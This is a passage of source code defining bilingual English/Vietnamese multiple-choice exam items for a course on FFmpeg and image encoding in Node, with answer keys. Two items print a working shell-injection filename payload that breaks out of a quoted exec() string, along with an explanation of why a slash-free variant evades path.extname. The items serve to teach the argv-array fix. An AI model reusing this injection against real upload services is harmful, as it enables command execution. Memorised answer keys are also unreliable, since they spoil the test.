            'Con số 80 nghĩa là một thứ với <code>libwebp</code> và một thứ khác với <code>libaom</code>; chúng dùng chung khoảng 1–100 và không chung gì khác. Mang qua nguyên xi thì nó sinh ra một file to gấp đôi ở mức chất lượng không ai thấy được, tức là tệ ở cả hai vế đánh đổi. Tinh chỉnh lại về mức tương đương cảm nhận thì nó cho đúng phần lợi mà AVIF đáng ra phải mang lại: 166 KB so với 264 KB, nhỏ hơn 37%. Cũng hãy để ý điều mà cột thời gian KHÔNG ủng hộ: trên bản dựng này (libaom 3.15.0, darwin-arm64), AVIF q=50 mất 623 ms so với 193 ms của WebP, tức 3,2 lần — lời văn giáo trình nói 10–13 lần, và điều đó không tái hiện được ở đây, nên lập luận về tốc độ để giữ WebP trên đường upload yếu hơn trên phần cứng này so với những gì bài học ngụ ý. Cái bẫy thang quality thì tái hiện chính xác; tỉ số tốc độ thì không. Phương án 1 bịa ra một khoản chi phí alpha. Phương án 3 sai một cách đo được ngay trong bảng này: effort không đổi qua cả năm dòng, và kích thước biến thiên gấp bốn lần thuần tuý do quality. Phương án 4 mâu thuẫn với hai dòng cuối, nơi AVIF thắng WebP thoải mái trên đúng tấm ảnh đó.',
          ),
        }),

        /* ── Chương 3 — FFmpeg từ Node (7 câu) ────────────────────────────── */

        // q18 · đáp án 0
        mcq({
          prompt: B(
            'A thumbnail service builds its command as a string and runs it through <code>exec()</code>. The input path is in double quotes, "so filenames with spaces are safe". A file was uploaded with this name, and the shell string was run for real:' +
              code("CHUỖI: ffmpeg -y -ss 00:00:01 -i \"/tmp/video-thumb-input-1.mp4\";touch INJECTION_PROOF;#\" -vframes 1 \"/tmp/out.jpg\"\nfile INJECTION_PROOF tồn tại? true") +
              'What is the fix, and why is it not "escape the filename better"?',
            'Một dịch vụ thumbnail dựng lệnh của nó thành một chuỗi rồi chạy qua <code>exec()</code>. Đường dẫn đầu vào nằm trong nháy kép, "cho an toàn với tên file có dấu cách". Một file được upload lên với cái tên này, và chuỗi shell đã được chạy thật:' +
              code("CHUỖI: ffmpeg -y -ss 00:00:01 -i \"/tmp/video-thumb-input-1.mp4\";touch INJECTION_PROOF;#\" -vframes 1 \"/tmp/out.jpg\"\nfile INJECTION_PROOF tồn tại? true") +
              'Cách vá là gì, và vì sao không phải là "escape tên file kỹ hơn"?',
          ),
          options: [
            B(
              'Pass an argv array to <code>execFile</code>/<code>spawn</code> so there is no shell at all. Every element becomes exactly one <code>argv</code> entry, with no word splitting, no quote parsing and no metacharacters. Measured with the identical filename: ffmpeg reported <code>Error opening input file /tmp/…mp4";touch INJECTION_PROOF2;#</code> and the file was not created. Escaping is a denylist of characters you thought of, and it has to be complete every time; removing the shell is a property of the call.',
              'Truyền một mảng argv cho <code>execFile</code>/<code>spawn</code> để không tồn tại shell nào cả. Mỗi phần tử trở thành đúng một mục <code>argv</code>, không tách từ, không phân giải dấu nháy, không ký tự đặc biệt. Đo với đúng cái tên file đó: ffmpeg báo <code>Error opening input file /tmp/…mp4";touch INJECTION_PROOF2;#</code> và file kia KHÔNG được tạo. Escape là một danh sách cấm gồm những ký tự bạn NGHĨ RA, và nó phải đầy đủ ở mọi lần; bỏ hẳn shell là một thuộc tính của lời gọi.',
            ),
            B(
              'Switch the double quotes to single quotes. A POSIX shell performs no expansion inside single quotes, so the semicolon and the closing quote lose their meaning and the whole tail is treated as part of the path.',
              'Đổi nháy kép thành nháy đơn. Một shell POSIX không thực hiện phép khai triển nào bên trong nháy đơn, nên dấu chấm phẩy và dấu nháy đóng mất hết ý nghĩa và cả phần đuôi được coi là một phần của đường dẫn.',
            ),
            B(
              'Keep <code>exec()</code> but add <code>{ shell: \'/bin/sh\', timeout: 60000 }</code> and validate that the MIME type is <code>video/*</code> before running. The upload gate is where a hostile filename should be stopped, and a timeout bounds the damage of anything that slips past it.',
              'Giữ <code>exec()</code> nhưng thêm <code>{ shell: \'/bin/sh\', timeout: 60000 }</code> và kiểm rằng MIME type là <code>video/*</code> trước khi chạy. Cổng upload mới là nơi phải chặn một tên file thù địch, và một timeout thì giới hạn thiệt hại của bất cứ thứ gì lọt qua.',
            ),
            B(
              'Run <code>path.normalize()</code> on the path before interpolating it. Normalisation collapses the segment containing the injected command into a single path component, after which the shell sees one word and the semicolon cannot start a new statement.',
              'Chạy <code>path.normalize()</code> lên đường dẫn trước khi nội suy nó vào. Phép chuẩn hoá gộp đoạn chứa lệnh được chèn thành một thành phần đường dẫn duy nhất, sau đó shell chỉ thấy một từ và dấu chấm phẩy không mở được câu lệnh mới.',
            ),
          ],
          correct: 0,
          explanation: EX(
            'The quotes look like the defence and they are the vulnerability. The attacker supplies a quote of their own: their <code>"</code> closes the quoted argument, their <code>;</code> ends the command, and their <code>#</code> comments out the rest of the line. Reproduced here end to end — the <code>touch</code> ran and the file appeared, as the Node process user, with that process\'s environment. The same filename passed to <code>execFileSync</code> as an argv element produced only <code>Error opening input file</code>, which is the correct outcome: a filename containing <code>;</code> is just a filename containing <code>;</code>, and no such file exists. Option 2 is a common belief and false in the general case: single quotes are themselves closable by a single quote in the payload, and you are back where you started. Option 3 keeps the shell and leans on gates that were never designed to sanitize for one — the repo\'s <code>DANGEROUS_EXT</code> regex is <code>$</code>-anchored and this payload ends in <code>#</code>, while the family check only wants a <code>video/*</code> MIME the attacker sets themselves. A timeout bounds a hang, not an exploit. Option 4 misunderstands <code>normalize</code>, which is string arithmetic on separators and has no opinion about shell syntax.',
            'Mấy dấu nháy trông như phần phòng thủ và chúng chính là lỗ hổng. Kẻ tấn công cung cấp dấu nháy của riêng họ: dấu <code>"</code> của họ đóng cái tham số đang mở, dấu <code>;</code> của họ kết thúc câu lệnh, và dấu <code>#</code> của họ comment nốt phần còn lại của dòng. Đã tái hiện đầy đủ ở đây — lệnh <code>touch</code> đã chạy và file đã hiện ra, dưới quyền người dùng của tiến trình Node, với đúng môi trường của tiến trình đó. Cũng cái tên file ấy truyền cho <code>execFileSync</code> dưới dạng một phần tử argv chỉ sinh ra <code>Error opening input file</code>, và đó là kết cục ĐÚNG: một tên file chứa <code>;</code> chỉ là một tên file chứa <code>;</code>, và không có file nào như vậy tồn tại. Phương án 2 là một niềm tin phổ biến và sai trong trường hợp tổng quát: nháy đơn cũng bị đóng được bằng một nháy đơn nằm trong payload, và bạn quay lại vạch xuất phát. Phương án 3 giữ nguyên shell và dựa vào những cái cổng chưa bao giờ được thiết kế để làm sạch cho shell — biểu thức <code>DANGEROUS_EXT</code> của kho neo bằng <code>$</code> mà payload này kết thúc bằng <code>#</code>, còn phép kiểm họ thì chỉ muốn một MIME <code>video/*</code> do chính kẻ tấn công đặt. Timeout chặn được một cú treo, không chặn được một cú khai thác. Phương án 4 hiểu sai <code>normalize</code>, vốn là phép tính chuỗi trên các dấu phân cách và không có ý kiến gì về cú pháp shell.',
          ),
        }),

        // q19 · đáp án 3
        mcq({
          prompt: B(
            'Two candidate payloads were passed through <code>path.extname()</code>:' +
              code("\"clip.mp4\\\";touch /tmp/PWNED;#\"        → path.extname = \"\"\n\"clip.mp4\\\";touch INJECTION_PROOF;#\"  → path.extname = \".mp4\\\";touch INJECTION_PROOF;#\"") +
              'Why does the first one fail and the second survive intact?',
            'Hai payload ứng viên được cho đi qua <code>path.extname()</code>:' +
              code("\"clip.mp4\\\";touch /tmp/PWNED;#\"        → path.extname = \"\"\n\"clip.mp4\\\";touch INJECTION_PROOF;#\"  → path.extname = \".mp4\\\";touch INJECTION_PROOF;#\"") +
              'Vì sao cái đầu hỏng còn cái sau sống nguyên vẹn?',
          ),
          options: [
            B(
              'The first contains an absolute path, and <code>extname</code> refuses to return an extension for any argument that begins a new absolute path anywhere in the string, treating it as two separate arguments.',
              '<code>extname</code> từ chối trả về đuôi cho bất cứ tham số nào bắt đầu một đường dẫn tuyệt đối mới ở bất kỳ đâu trong chuỗi, và cái đầu có chứa một đường dẫn tuyệt đối, nên nó bị coi là hai tham số riêng.',
            ),
            B(
              'The first is longer than the 16-character limit Node applies to extensions, so it is discarded; the second happens to fall under that limit once the leading dot is excluded from the count.',
              'Cái đầu dài hơn giới hạn 16 ký tự mà Node áp cho phần đuôi nên bị loại; cái sau tình cờ lọt dưới giới hạn đó khi dấu chấm mở đầu không được tính vào.',
            ),
            B(
              'The <code>#</code> in the first payload starts a fragment, and <code>extname</code> strips everything from a <code>#</code> onward before looking for the last dot, which leaves no dot to find.',
              'Dấu <code>#</code> trong payload đầu mở một fragment, và <code>extname</code> bóc mọi thứ từ dấu <code>#</code> trở đi trước khi đi tìm dấu chấm cuối cùng, nên chẳng còn dấu chấm nào để tìm.',
            ),
            B(
              '<code>extname</code> operates on the <b>last path segment</b>. The <code>/</code> in <code>/tmp/PWNED</code> makes the last segment <code>PWNED;#</code>, which has no dot, so it returns an empty string and the payload neutralises itself. A slash-free payload has one segment, and everything after the final dot survives — which is exactly the tail that, interpolated into a shell string, closes the quote and runs a command.',
              '<code>extname</code> làm việc trên <b>đoạn đường dẫn cuối cùng</b>. Dấu <code>/</code> trong <code>/tmp/PWNED</code> khiến đoạn cuối là <code>PWNED;#</code>, vốn không có dấu chấm, nên nó trả về chuỗi rỗng và payload tự vô hiệu hoá chính mình. Một payload KHÔNG có dấu gạch chéo thì chỉ có một đoạn, và mọi thứ sau dấu chấm cuối đều sống sót — đúng cái đuôi mà khi nội suy vào một chuỗi shell sẽ đóng dấu nháy và chạy một câu lệnh.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'A small detail with a large consequence, and it is the reason a first attempt at this exploit often "fails" and gets written off. <code>path.extname</code> looks only at the substring after the last separator: for <code>clip.mp4";touch /tmp/PWNED;#</code> that substring is <code>PWNED;#</code>, which contains no dot, so the function returns <code>""</code> and the caller falls back to a default extension — the payload destroyed itself with its own slash. Drop the slash and the whole string is one segment; <code>extname</code> returns everything from <code>.mp4</code> onward, tail included, and that tail goes straight into the command string. The durable lesson is not "watch out for slashes" but the one the fix encodes: never derive a filesystem path from a user-supplied name at all. <code>randomUUID() + \'.mp4\'</code> works for every container ffmpeg can read, because ffmpeg sniffs the format from the bytes rather than the extension. Options 1, 2 and 3 all invent rules Node does not have; the only rule in play is "last segment, last dot".',
            'Một chi tiết nhỏ với hậu quả lớn, và nó là lý do một lần thử khai thác đầu tiên hay "thất bại" rồi bị bỏ qua. <code>path.extname</code> chỉ nhìn vào phần chuỗi sau dấu phân cách cuối cùng: với <code>clip.mp4";touch /tmp/PWNED;#</code> thì phần đó là <code>PWNED;#</code>, vốn không chứa dấu chấm, nên hàm trả về <code>""</code> và người gọi lùi về một đuôi mặc định — payload đã tự huỷ bằng chính dấu gạch chéo của nó. Bỏ dấu gạch chéo đi thì cả chuỗi là một đoạn duy nhất; <code>extname</code> trả về mọi thứ từ <code>.mp4</code> trở đi, kèm cả cái đuôi, và cái đuôi đó đi thẳng vào chuỗi lệnh. Bài học bền vững không phải "coi chừng dấu gạch chéo" mà là điều mà chính cách vá mã hoá lại: đừng bao giờ suy một đường dẫn hệ thống file từ một cái tên do người dùng cung cấp. <code>randomUUID() + \'.mp4\'</code> chạy được với mọi container ffmpeg đọc được, vì ffmpeg đánh hơi định dạng từ các byte chứ không từ cái đuôi. Phương án 1, 2 và 3 đều bịa ra những quy tắc Node không có; quy tắc duy nhất đang có hiệu lực là "đoạn cuối, dấu chấm cuối".',
          ),
        }),

        // q20 · đáp án 2
        mcq({
          prompt: B(
            'A thumbnail job was timed against a 3-minute 640×360 MP4, three runs each, on an otherwise idle machine:' +
              code("-ss 00:02:50 TRƯỚC -i        59 ms   (3 lượt: 69/59/63)\n-i rồi -ss 00:02:50 (SAU)   548 ms   (3 lượt: 562/548/573)\n-ss 00:00:01 TRƯỚC -i        69 ms   (3 lượt: 64/69/66)\n-i rồi -ss 00:00:01 (SAU)    67 ms   (3 lượt: 86/67/68)") +
              'Which reading of these four rows is correct?',
            'Một job thumbnail được bấm giờ trên một MP4 3 phút 640×360, mỗi kiểu ba lượt, trên một máy đang rảnh:' +
              code("-ss 00:02:50 TRƯỚC -i        59 ms   (3 lượt: 69/59/63)\n-i rồi -ss 00:02:50 (SAU)   548 ms   (3 lượt: 562/548/573)\n-ss 00:00:01 TRƯỚC -i        69 ms   (3 lượt: 64/69/66)\n-i rồi -ss 00:00:01 (SAU)    67 ms   (3 lượt: 86/67/68)") +
              'Cách đọc nào đúng với bốn dòng này?',
          ),
          options: [
            B(
              'Placing <code>-ss</code> after <code>-i</code> adds a fixed startup cost of roughly half a second while ffmpeg rebuilds its filter graph for output-side seeking; the last two rows differ by only 2 ms because a one-second seek is short enough for that setup to overlap with decoding.',
              'Đặt <code>-ss</code> sau <code>-i</code> thêm một chi phí khởi động cố định khoảng nửa giây trong lúc ffmpeg dựng lại đồ thị bộ lọc cho kiểu tua phía output; hai dòng cuối chỉ chênh 2 ms vì một lượt tua một giây đủ ngắn để phần dựng đó chồng lấn với việc giải mã.',
            ),
            B(
              'The gap is caused by keyframe density: at 2:50 the nearest keyframe is far away, so ffmpeg must decode forward to reach it regardless of argument order, and the first row is fast only because that particular offset happened to land on a keyframe.',
              'Khoảng cách do mật độ keyframe: ở mốc 2:50 keyframe gần nhất nằm xa, nên ffmpeg phải giải mã tiến tới đó bất kể thứ tự tham số, và dòng đầu nhanh chỉ vì độ lệch cụ thể đó tình cờ rơi trúng một keyframe.',
            ),
            B(
              'Before <code>-i</code> is <b>input seeking</b>: ffmpeg jumps via the container index, so the cost is roughly flat regardless of offset — 59 ms at 2:50 and 69 ms at 0:01. After <code>-i</code> is <b>output seeking</b>: ffmpeg decodes from frame zero and discards everything up to the timestamp, so the cost grows with the offset — 548 ms at 2:50 but only 67 ms at 0:01, where there is almost nothing to discard. The rows with a one-second offset are indistinguishable, which is why this bug survives testing on short clips.',
              'Trước <code>-i</code> là <b>tua phía input</b>: ffmpeg nhảy qua chỉ mục container, nên chi phí gần như phẳng bất kể độ lệch — 59 ms ở 2:50 và 69 ms ở 0:01. Sau <code>-i</code> là <b>tua phía output</b>: ffmpeg giải mã từ frame số không rồi vứt bỏ mọi thứ tới mốc thời gian, nên chi phí tăng theo độ lệch — 548 ms ở 2:50 nhưng chỉ 67 ms ở 0:01, nơi gần như chẳng có gì để vứt. Hai dòng có độ lệch một giây thì không phân biệt được, và đó là lý do bug này sống sót qua khâu kiểm thử trên các clip ngắn.',
            ),
            B(
              'Both placements do the same work, and the 548 ms row reflects the JPEG encode rather than the seek; at a late timestamp the frame has accumulated more inter-frame residual, so it is more expensive to encode as a still image.',
              'Cả hai cách đặt đều làm cùng một việc, và dòng 548 ms phản ánh lượt encode JPEG chứ không phải lượt tua; ở một mốc thời gian muộn, frame đã tích luỹ nhiều phần dư liên-frame hơn nên encode nó thành ảnh tĩnh tốn kém hơn.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The four rows are a two-by-two design and the interaction is the answer: the placement only matters when the offset is large. Input seeking uses the container index to jump to the nearest keyframe at or before the target and decodes a few frames forward, so its cost barely moves between a 1-second and a 170-second offset. Output seeking decodes the file from the beginning and throws frames away until the timestamp arrives, so its cost is proportional to how far in you asked for. The ratio here is 9.3×, not the 318× the course quotes — that figure was measured on a much longer, much larger file, and the ratio scales with duration and resolution, which is why the exam asks about the mechanism rather than the number. The trade for input seeking is accuracy: you land on the nearest keyframe, which is fine for a thumbnail and not fine for "the frame at exactly 00:04:17.32", where you use a coarse <code>-ss</code> before <code>-i</code> and a fine one after. Options 1 and 4 invent fixed costs that the fourth row disproves. Option 2 gets keyframes backwards — a distant keyframe is what input seeking handles well.',
            'Bốn dòng này là một thiết kế hai-nhân-hai và chính sự tương tác mới là câu trả lời: vị trí đặt chỉ quan trọng khi độ lệch LỚN. Tua phía input dùng chỉ mục container để nhảy tới keyframe gần nhất ở hoặc trước đích rồi giải mã tiến vài frame, nên chi phí của nó gần như không nhúc nhích giữa độ lệch 1 giây và 170 giây. Tua phía output giải mã file từ đầu và vứt frame đi tới khi mốc thời gian tới, nên chi phí tỉ lệ với việc bạn hỏi tới chỗ nào. Tỉ số ở đây là 9,3 lần, không phải 318 lần như giáo trình trích — con số đó đo trên một file dài hơn và lớn hơn nhiều, và tỉ số này tăng theo thời lượng lẫn độ phân giải, đó là lý do đề hỏi CƠ CHẾ chứ không hỏi con số. Cái giá của tua phía input là độ chính xác: bạn rơi vào keyframe gần nhất, vốn ổn với một thumbnail và không ổn với "đúng frame ở 00:04:17.32", nơi bạn dùng một <code>-ss</code> thô trước <code>-i</code> và một cái tinh ở sau. Phương án 1 và 4 bịa ra những chi phí cố định mà dòng thứ tư bác bỏ. Phương án 2 hiểu ngược về keyframe — một keyframe ở xa đúng là thứ mà tua phía input xử lý tốt.',
          ),
        }),

        // q21 · đáp án 0
        mcq({
          prompt: B(
            'A clip was encoded three ways and each result probed:' +
              code("p444          pix_fmt=yuv444p  profile=High 4:4:4 Predictive\np444-copyfmt  pix_fmt=yuv444p  profile=High 4:4:4 Predictive\np420          pix_fmt=yuv420p  profile=High") +
              'The middle row is a re-encode of the first with <code>-c:v libx264 -crf 23 -preset veryfast</code> and nothing else. What does it demonstrate, and what does it cost you in production?',
            'Một clip được encode ba kiểu và mỗi kết quả được probe:' +
              code("p444          pix_fmt=yuv444p  profile=High 4:4:4 Predictive\np444-copyfmt  pix_fmt=yuv444p  profile=High 4:4:4 Predictive\np420          pix_fmt=yuv420p  profile=High") +
              'Dòng giữa là bản encode lại của dòng đầu với <code>-c:v libx264 -crf 23 -preset veryfast</code> và không gì khác. Nó chứng minh điều gì, và trên production nó khiến bạn trả giá gì?',
          ),
          options: [
            B(
              'libx264 inherits the source pixel format unless you name one, so a 4:4:4 source stays 4:4:4 through a re-encode and lands in the High 4:4:4 Predictive profile. That profile plays in Chrome and VLC and black-screens on Safari and QuickTime, which decode only 4:2:0 in H.264 — a bug that reproduces only on hardware the author may not own, so it survives review. <code>-pix_fmt yuv420p</code> belongs in the baseline recipe, next to <code>-movflags +faststart</code>.',
              'libx264 THỪA KẾ pixel format của nguồn trừ khi bạn chỉ định, nên một nguồn 4:4:4 vẫn là 4:4:4 qua một lượt encode lại và rơi vào profile High 4:4:4 Predictive. Profile đó phát được ở Chrome và VLC còn Safari với QuickTime thì đen màn hình, vì chúng chỉ giải mã 4:2:0 trong H.264 — một bug chỉ tái hiện trên phần cứng mà chính tác giả có thể không có, nên nó sống sót qua review. <code>-pix_fmt yuv420p</code> thuộc về công thức nền, ngay cạnh <code>-movflags +faststart</code>.',
            ),
            B(
              'It demonstrates that <code>-crf</code> and <code>-preset</code> are mutually exclusive with chroma conversion: naming either one disables the automatic downsample to 4:2:0 that libx264 would otherwise apply. Dropping <code>-preset</code> restores the conversion.',
              'Nó chứng minh rằng <code>-crf</code> và <code>-preset</code> loại trừ lẫn nhau với việc chuyển đổi chroma: chỉ định một trong hai sẽ tắt phép hạ mẫu tự động xuống 4:2:0 mà libx264 vốn sẽ áp dụng. Bỏ <code>-preset</code> đi sẽ khôi phục phép chuyển đổi.',
            ),
            B(
              'It demonstrates a container problem rather than a codec one: MP4 cannot signal 4:2:0 for a stream that was previously 4:4:4, so the probe reports the old value even though the pixels were converted. Remuxing into a fresh MP4 makes the probe agree with reality.',
              'Nó chứng minh một vấn đề của container chứ không phải của codec: MP4 không báo hiệu được 4:2:0 cho một luồng vốn từng là 4:4:4, nên probe báo giá trị cũ dù pixel đã được chuyển đổi. Remux vào một MP4 mới sẽ làm probe khớp với thực tế.',
            ),
            B(
              'It demonstrates that the profile, not the pixel format, is what matters: High 4:4:4 Predictive is a Main-profile extension that older decoders reject, so the fix is <code>-profile:v baseline</code> and the pixel format follows from it automatically.',
              'Nó chứng minh rằng PROFILE, chứ không phải pixel format, mới là thứ quan trọng: High 4:4:4 Predictive là một phần mở rộng của profile Main mà các bộ giải mã cũ từ chối, nên cách vá là <code>-profile:v baseline</code> và pixel format sẽ tự theo sau.',
            ),
          ],
          correct: 0,
          explanation: EX(
            'The measurement isolates one variable. The first file was deliberately encoded 4:4:4. The second re-encodes it with a normal-looking recipe that names a codec, a CRF and a preset but no pixel format — and the chroma subsampling passes straight through, profile and all. The third adds <code>-pix_fmt yuv420p</code> and lands in plain High. Sources that arrive as 4:2:2 or 4:4:4 are not exotic: ProRes, screen recordings and some camera formats all do it, so this reaches production through ordinary uploads. The consequence is the Safari black screen, which is the worst kind of bug to catch late because it needs hardware to reproduce. Note the honest boundary here: the pixel format and profile above were measured; the Safari decoder behaviour is a cited fact this environment cannot test. Option 2 invents an interaction — CRF and preset control rate and search effort and have nothing to do with chroma. Option 3 is wrong about MP4, which signals the format fine; the probe is reading the real stream. Option 4 confuses cause and effect: the profile is chosen <em>because</em> of the pixel format, and forcing baseline would also disable features you want while still leaving 4:4:4 unrepresentable.',
            'Phép đo cô lập đúng một biến. File đầu được cố ý encode ở 4:4:4. File thứ hai encode lại nó bằng một công thức trông rất bình thường, có nêu codec, CRF và preset nhưng không nêu pixel format — và phần hạ mẫu chroma đi thẳng qua, kéo theo cả profile. File thứ ba thêm <code>-pix_fmt yuv420p</code> và rơi vào profile High thường. Những nguồn tới ở dạng 4:2:2 hay 4:4:4 không hề kỳ lạ: ProRes, bản ghi màn hình và một số định dạng máy quay đều vậy, nên nó vào production qua những lượt upload hết sức bình thường. Hậu quả là màn hình đen trên Safari, kiểu bug tệ nhất để phát hiện muộn vì muốn tái hiện phải có phần cứng. Hãy để ý ranh giới trung thực ở đây: pixel format và profile bên trên là ĐO ĐƯỢC; còn hành vi của bộ giải mã Safari là một dữ kiện TRÍCH DẪN mà môi trường này không kiểm được. Phương án 2 bịa ra một tương tác — CRF và preset điều khiển tốc độ bit và công sức tìm kiếm, chẳng liên quan gì tới chroma. Phương án 3 sai về MP4, vốn báo hiệu định dạng bình thường; probe đang đọc đúng luồng thật. Phương án 4 lẫn nguyên nhân với kết quả: profile được chọn VÌ pixel format, và ép baseline còn tắt luôn những tính năng bạn cần trong khi vẫn không biểu diễn được 4:4:4.',
          ),
        }),

        // q22 · đáp án 2
        mcq({
          prompt: B(
            'The same 3,645,995-byte MP4 was remuxed twice and the atom order dumped:' +
              code("nofs  size=3645995  6 atom đầu: ftyp free mdat moov mvhd trak\nfs    size=3645995  6 atom đầu: ftyp moov mvhd trak tkhd edts") +
              'The second used <code>-movflags +faststart</code>. Read the two rows: what changed, what did not, and what does it buy?',
            'Cùng một MP4 3.645.995 byte được remux hai lần và thứ tự atom được dump ra:' +
              code("nofs  size=3645995  6 atom đầu: ftyp free mdat moov mvhd trak\nfs    size=3645995  6 atom đầu: ftyp moov mvhd trak tkhd edts") +
              'Hãy đọc hai dòng: cái gì đổi, cái gì không, và nó mua được gì?',
          ),
          options: [
            B(
              'The flag re-encoded the video with a smaller GOP so the index could be written first; the byte counts match by coincidence because the smaller index offsets the larger keyframe count. What it buys is faster seeking, at a small quality cost.',
              'Cái cờ đã encode lại video với GOP nhỏ hơn để chỉ mục ghi được lên trước; số byte trùng nhau là do tình cờ, vì chỉ mục nhỏ hơn bù lại số keyframe nhiều hơn. Thứ nó mua được là tua nhanh hơn, kèm một chút hao chất lượng.',
            ),
            B(
              'The flag added a <code>free</code> atom as padding at the head of the file so that future edits can grow the index in place; the playback benefit comes from that reserved space rather than from the index position itself.',
              'Cái cờ đã thêm một atom <code>free</code> làm phần đệm ở đầu file để những lần sửa sau có thể nới chỉ mục tại chỗ; lợi ích lúc phát đến từ khoảng trống dành sẵn đó chứ không phải từ vị trí của chỉ mục.',
            ),
            B(
              'Nothing was re-encoded — both files are 3,645,995 bytes, so this is a container remux that moved the <code>moov</code> index from after the media data to immediately after <code>ftyp</code>. A player can then read the index from the first request and start decoding, instead of having to reach the tail of the file before it knows where any frame is.',
              'Không có gì được encode lại — cả hai file đều 3.645.995 byte, nên đây là một lượt REMUX container đã dời chỉ mục <code>moov</code> từ sau phần dữ liệu media lên ngay sau <code>ftyp</code>. Trình phát khi đó đọc được chỉ mục ngay từ lượt yêu cầu đầu tiên và bắt đầu giải mã, thay vì phải với tới đuôi file rồi mới biết frame nào nằm ở đâu.',
            ),
            B(
              'The flag rewrote the <code>mdat</code> atom into interleaved fragments, which is why <code>mdat</code> disappears from the second listing; the index is then distributed through the file rather than stored in one place, which is what makes progressive playback possible.',
              'Cái cờ đã viết lại atom <code>mdat</code> thành các mảnh xen kẽ, và đó là lý do <code>mdat</code> biến khỏi danh sách thứ hai; chỉ mục khi đó được rải khắp file thay vì nằm một chỗ, và chính điều đó làm cho việc phát dần khả thi.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Two facts do all the work. The byte counts are identical, so no pixels were touched — this is a remux, and it is cheap. And the atom order changed: <code>moov</code> moved from third position (after <code>mdat</code>, the media payload) to second, right behind <code>ftyp</code>. That index is what says where every frame lives, so a player that does not have it cannot decode anything. With the index at the front the first Range request already contains it. Without it the player must fetch the tail first; a client that speaks Range does that in two requests, but a naive one downloads the whole file before the first frame appears. Note <code>mdat</code> is simply below the sixth atom in the second listing, not gone — the six-atom window just fills up with <code>moov</code>\'s children once <code>moov</code> comes first. Option 1 is contradicted by the equal sizes. Option 2 has the <code>free</code> atom backwards: it is present in the <em>un</em>-flagged file, as leftover space where the header was rewritten. Option 4 describes fragmented MP4, which is a different flag (<code>frag_keyframe+empty_moov</code>) with a different purpose.',
            'Hai dữ kiện làm hết mọi việc. Số byte giống hệt nhau, nên không có pixel nào bị đụng tới — đây là một lượt remux, và nó rẻ. Và thứ tự atom đã đổi: <code>moov</code> dời từ vị trí thứ ba (sau <code>mdat</code>, tức phần dữ liệu media) lên vị trí thứ hai, ngay sau <code>ftyp</code>. Chính cái chỉ mục đó nói frame nào nằm ở đâu, nên một trình phát chưa có nó thì chẳng giải mã được gì. Với chỉ mục nằm ở đầu, lượt yêu cầu Range đầu tiên đã chứa sẵn nó. Không có nó thì trình phát phải lấy phần đuôi trước; một client biết nói Range làm việc đó trong hai lượt yêu cầu, còn một client ngây thơ thì tải cả file về rồi frame đầu tiên mới hiện. Lưu ý <code>mdat</code> chỉ nằm dưới atom thứ sáu trong danh sách thứ hai chứ không biến mất — cửa sổ sáu atom bị lấp đầy bởi các atom con của <code>moov</code> một khi <code>moov</code> lên trước. Phương án 1 bị chính hai con số kích thước bằng nhau bác bỏ. Phương án 2 nói ngược về atom <code>free</code>: nó có mặt trong file KHÔNG có cờ, như phần không gian thừa chỗ header bị viết lại. Phương án 4 mô tả MP4 phân mảnh, vốn là một cờ khác (<code>frag_keyframe+empty_moov</code>) với mục đích khác.',
          ),
        }),

        // q23 · đáp án 1
        mcq({
          prompt: B(
            'A 10-second 720p MP4 that is already H.264 + AAC was processed two ways, three runs each:' +
              code("-c copy -movflags +faststart          63 ms   (3 lượt: 63/63/63)\nre-encode crf23 preset medium        922 ms   (3 lượt: 878/922/840)\nkích thước: nguồn 3645995 · copy 3645995 · re-encode 3481119") +
              'A user complains their upload takes 40 seconds to start playing. Which path, and how do you decide?',
            'Một MP4 720p dài 10 giây vốn đã là H.264 + AAC được xử lý hai kiểu, mỗi kiểu ba lượt:' +
              code("-c copy -movflags +faststart          63 ms   (3 lượt: 63/63/63)\nre-encode crf23 preset medium        922 ms   (3 lượt: 878/922/840)\nkích thước: nguồn 3645995 · copy 3645995 · re-encode 3481119") +
              'Một người dùng than rằng bản upload của họ mất 40 giây mới bắt đầu phát. Chọn đường nào, và quyết định thế nào?',
          ),
          options: [
            B(
              'Re-encode, because the copy path leaves the file byte-identical and therefore cannot have fixed anything; the 40-second delay is a bitrate problem and only a lower CRF reduces the time to first frame.',
              'Encode lại, vì đường copy để file giống hệt từng byte nên không thể đã sửa được gì; độ trễ 40 giây là vấn đề bitrate và chỉ hạ CRF mới giảm được thời gian tới frame đầu tiên.',
            ),
            B(
              'Probe first with <code>ffprobe</code>, and if the source is already H.264 + AAC then <code>-c copy -movflags +faststart</code> is the whole fix: 63 ms against 922 ms here, and lossless, because no stream is decoded — only the container index is moved. Re-encoding would spend 14× the CPU to make the file <em>worse</em>, since a second lossy pass reproduces the first encoder\'s artifacts and adds its own.',
              'Hãy PROBE trước bằng <code>ffprobe</code>, và nếu nguồn vốn đã là H.264 + AAC thì <code>-c copy -movflags +faststart</code> là toàn bộ cách vá: 63 ms so với 922 ms ở đây, và không mất chất lượng, vì không luồng nào bị giải mã — chỉ chỉ mục container được dời đi. Encode lại sẽ tốn gấp 14 lần CPU để làm file TỆ ĐI, vì một lượt nén mất dữ liệu thứ hai tái tạo lại artifact của bộ encode trước rồi cộng thêm artifact của chính nó.',
            ),
            B(
              'Always re-encode, because <code>-c copy</code> cannot apply <code>-movflags</code> — container flags require a muxer that owns the stream, and a copy passes packets through untouched. The 63 ms figure is the command failing fast.',
              'Luôn encode lại, vì <code>-c copy</code> không áp được <code>-movflags</code> — các cờ container đòi một muxer sở hữu luồng, mà một lượt copy thì cho gói tin đi qua nguyên vẹn. Con số 63 ms là lệnh đó hỏng nhanh.',
            ),
            B(
              'Neither: a 40-second start is a delivery problem, so the correct fix is to raise the CDN cache TTL and enable HTTP/2 push for the first megabyte. Touching the file at all is treating a symptom that lives in the network layer.',
              'Không đường nào cả: 40 giây mới bắt đầu là vấn đề PHÁT, nên cách vá đúng là nâng TTL cache của CDN và bật HTTP/2 push cho megabyte đầu tiên. Đụng vào file là chữa một triệu chứng vốn nằm ở tầng mạng.',
            ),
          ],
          correct: 1,
          explanation: EX(
